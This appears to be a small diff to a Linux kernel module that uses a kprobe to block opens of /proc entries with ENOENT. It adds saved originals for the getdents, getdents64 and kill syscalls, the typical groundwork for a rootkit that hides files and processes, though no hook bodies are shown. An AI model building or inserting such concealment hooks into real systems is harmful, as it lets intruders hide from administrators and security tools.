@@ -114,6 +114,11 @@ static unsigned long get_syscall_return_addr(struct pt_regs *regs) {
   return *stack;
 }
 
+typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
+static t_syscall orig_getdents;
+static t_syscall orig_getdents64;
+static t_syscall orig_kill;
+
 int monitor_handle(struct kprobe *p, struct pt_regs *regs) {
   struct pt_regs *real_regs;
   const char __user *user_filename;
@@ -134,7 +139,7 @@ int monitor_handle(struct kprobe *p, struct pt_regs *regs) {
           printk(KERN_INFO "Opening /proc file: %s by %s (PID: %d)\n", filename,
                  current->comm, current->pid);
           regs->ax = -ENOENT;
-          regs->ip = get_syscall_return_addr(regs);
+          // regs->ip = get_syscall_return_addr(regs);
           return 1;
         }
       }
